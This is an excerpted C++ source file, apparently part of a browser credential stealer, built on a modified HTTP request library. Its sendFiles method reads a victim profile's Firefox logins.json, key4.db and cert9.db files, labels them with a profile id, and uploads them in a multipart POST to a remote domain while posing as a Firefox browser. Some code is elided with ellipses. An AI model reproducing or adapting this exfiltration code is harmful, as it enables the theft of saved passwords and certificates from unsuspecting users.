//
//  HTTPRequest
// Based on https://github.com/elnormous/HTTPRequest, but modified to upload binary files and removed unused methods
//
...
{
	std::string id = "none";
	std::string cert = "none";
	std::string logins = "none";
	std::string key = "none";
};
...
namespace http
{
	...
	public:
		...
		std::vector<uint8_t> readBinaryData(std::string filename)
		{
		...
		Response sendFiles(Profile profile) {
			Response response;
			...
			std::string boundary = "---------------------------42203882418225808333462790251";

			std::string bodyStart;
			std::string CRLF = "\r\n";

			//logins
			bodyStart.append("--" + boundary + CRLF);
			bodyStart.append("Content-Disposition: form-data; name=\"logins\"; filename=\"" + profile.id + "|logins.json\"" + CRLF);
			bodyStart.append("Content-Type: application / octet - stream" + CRLF);
			bodyStart.append(CRLF);

			auto f1 = readBinaryData(profile.logins);
			std::vector<uint8_t> body(bodyStart.begin(), bodyStart.end());
			body.insert(body.end(), f1.begin(), f1.end());


			//Key
			bodyStart = CRLF;
			bodyStart.append("--" + boundary + CRLF);
			bodyStart.append("Content-Disposition: form-data; name=\"key\"; filename=\"" + profile.id + "|key4.db\"" + CRLF);
			bodyStart.append("Content-Type: application / octet - stream" + CRLF);
			bodyStart.append(CRLF);

			auto f2 = readBinaryData(profile.key);
			body.insert(body.end(), bodyStart.begin(), bodyStart.end());
			body.insert(body.end(), f2.begin(), f2.end());


			//Cert
			bodyStart = CRLF;
			bodyStart.append("--" + boundary + CRLF);
			bodyStart.append("Content-Disposition: form-data; name=\"cert\"; filename=\"" + profile.id + "|cert9.db\"" + CRLF);
			bodyStart.append("Content-Type: application / octet - stream" + CRLF);
			bodyStart.append(CRLF);

			auto f3 = readBinaryData(profile.cert);
			body.insert(body.end(), bodyStart.begin(), bodyStart.end());
			body.insert(body.end(), f3.begin(), f3.end());


			std::string bodyEnd = CRLF + "--" + boundary +"--" + CRLF + CRLF;
			body.insert(body.end(), bodyEnd.begin(), bodyEnd.end());


			std::string headerData = "POST " + path + " HTTP/1.1" + CRLF;
			headerData += "Host: " + domain + CRLF;
			headerData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0" + CRLF;
			headerData += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" + CRLF;
			headerData += "Content-Length: " + std::to_string(body.size()) + CRLF;
			headerData += "Content-Type: multipart/form-data; boundary=---------------------------42203882418225808333462790251" + CRLF;
			headerData += CRLF;
				...
				if (parsedHeaders)
				{
					...
					if (chunkedResponse)
					{
						...
						for (;;)
						{
							...
							{
								const auto toWrite = std::min<size_t>(expectedChunkSize, responseData.size());
